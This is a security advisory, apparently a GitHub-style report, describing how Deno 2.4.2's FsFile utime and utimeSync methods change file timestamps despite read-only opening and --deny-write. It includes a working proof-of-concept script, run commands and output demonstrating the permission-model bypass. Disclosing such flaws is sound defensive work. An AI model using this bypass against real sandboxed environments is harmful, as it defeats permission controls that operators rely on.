summary: "Deno's --deny-write check does not prevent permission bypass\n### Summary\n\n`Deno.FsFile.prototype.utime`\
  \ and `Deno.FsFile.prototype.utimeSync` are not limited by the permission model check `--deny-write=./`.\n\
  \nIt's possible to change to change the access (`atime`) and modification (`mtime`) times\
  \ on the file stream resource even when the file is opened with `read` only permission (and\
  \ `write`: `false`) and file write operations are not allowed (the script is executed with\
  \ `--deny-write=./`).\n\nSimilar APIs like `Deno.utime` and `Deno.utimeSync` require `allow-write` permission,\
  \ however, when a file is opened, even with read only flags and deny-write permission, it's\
  \ still possible to change the access (`atime`) and modification (`mtime`) times, and thus\
  \ bypass the permission model.\n\n### PoC\n\nSetup:\n```\ndeno --version\ndeno 2.4.2 (stable,\
  \ release, x86_64-unknown-linux-gnu)\nv8 13.7.152.14-rusty\ntypescript 5.8.3\n\ntouch test.txt\n\
  ```\n\n```js\n// touch test.txt\n// https://docs.deno.com/api/deno/~/Deno.FsFile.prototype.utime\n\
  // deno run --allow-read=./ --deny-write=./ poc_file.utime.ts 1\nasync function poc1(){\n\
  \    using file = await Deno.open(\"./test.txt\", { read: true, write: false});\n\n    const\
  \ fileInfoBefore = await file.stat();\n    \n    await file.utime(new Date(\"2000-01-01\"\
  ), new Date(\"2000-01-01\"));\n    \n    const fileInfoAfter = await file.stat();\n    \n\
  \    \n    console.log(`BEFORE (utime)`)\n    console.log(new Date(fileInfoBefore.mtime).getFullYear())\n\
  \    console.log(new Date(fileInfoBefore.atime).getFullYear())\n    \n    \n    console.log(`AFTER\
  \ (utime)`)\n    console.log(new Date(fileInfoAfter.mtime).getFullYear())\n    console.log(new\
  \ Date(fileInfoAfter.atime).getFullYear())\n}\n\n\n// https://docs.deno.com/api/deno/~/Deno.FsFile.prototype.utimeSync\n\
  // deno run --allow-read=./ --deny-write=./ poc_file.utime.ts 2\nfunction poc2(){\n    using\
  \ file = Deno.openSync(\"./test.txt\", { read: true, write: false});\n\n    const fileInfoBefore\
  \ = file.statSync();\n    \n    file.utimeSync(new Date(\"2001-01-01\"), new Date(\"2001-01-01\"\
  ));\n    \n    const fileInfoAfter = file.statSync();\n    \n    \n    console.log(`BEFORE\
  \ (utimeSync)`)\n    console.log(new Date(fileInfoBefore.mtime).getFullYear())\n    console.log(new\
  \ Date(fileInfoBefore.atime).getFullYear())\n    \n    \n    console.log(`AFTER (utimeSync)`)\n\
  \    console.log(new Date(fileInfoAfter.mtime).getFullYear())\n    console.log(new Date(fileInfoAfter.atime).getFullYear())\n\
  }\n\n// https://docs.deno.com/api/deno/~/Deno.utime\n// deno run --allow-read=./ --deny-write=./\
  \ poc_file.utime.ts 3\nasync function poc3(){\n    // not executed\n    await Deno.utime(\"\
  ./test.txt\", new Date(\"2000-01-01\"), new Date(\"2000-01-01\"));\n}\n\n// https://docs.deno.com/api/deno/~/Deno.utimeSync\n\
  // deno run --allow-read=./ --deny-write=./ poc_file.utime.ts 4\nfunction poc4(){\n    //\
  \ not executed\n    Deno.utimeSync(\"./test.txt\", new Date(\"2000-01-01\"), new Date(\"2000-01-01\"\
  ));\n}\n\n\nasync function main(){\n    const poc = Deno.args[0] || 1;\n\n    const status\
  \ = await Deno.permissions.query({ name: \"write\", path: \"./\" });\n    console.log(status);\n\
  \    switch (poc) {\n        case \"1\":\n            poc1()\n            break;\n       \
  \ case \"2\":\n            poc2()\n            break;\n        case \"3\":\n            poc3()\n\
  \            break;\n        case \"4\":\n            poc4()\n            break;\n       \
  \ default:\n            poc1()\n    }\n}\n\nmain()\n```\n\nOutput:\n- `deno run --allow-read=./\
  \ --deny-write=./ poc_file.utime.ts 1`\n```\nPermissionStatus { state: \"denied\", onchange:\
  \ null }\nBEFORE (utime)\n2025\n2025\nAFTER (utime)\n2000\n2000\n```\n\n- `deno run --allow-read=./\
  \ --deny-write=./ poc_file.utime.ts 2`\n```\nPermissionStatus { state: \"denied\", onchange:\
  \ null }\nBEFORE (utimeSync)\n2000\n2000\nAFTER (utimeSync)\n2001\n2001\n```\n\n- `deno run\
  \ --allow-read=./ --deny-write=./ poc_file.utime.ts 3`\n```\nPermissionStatus { state: \"\
  denied\", onchange: null }\nerror: Uncaught (in promise) NotCapable: Requires write access\
  \ to \"./test.txt\", run again with the --allow-write flag\n    await Deno.utime(\"./test.txt\"\
  , new Date(\"2000-01-01\"), new Date(\"2000-01-01\"));\n               ^\n    ...\n```\n\n\
  - `deno run --allow-read=./ --deny-write=./ poc_file.utime.ts 4`\n```\nPermissionStatus {\
  \ state: \"denied\", onchange: null }\nerror: Uncaught (in promise) NotCapable: Requires write\
  \ access to \"./test.txt\", run again with the --allow-write flag\n    Deno.utimeSync(\"./test.txt\"\
  , new Date(\"2000-01-01\"), new Date(\"2000-01-01\"));\n         ^\n    ...\n```\n\n\n###\
  \ Impact\n\nPermission model bypass"
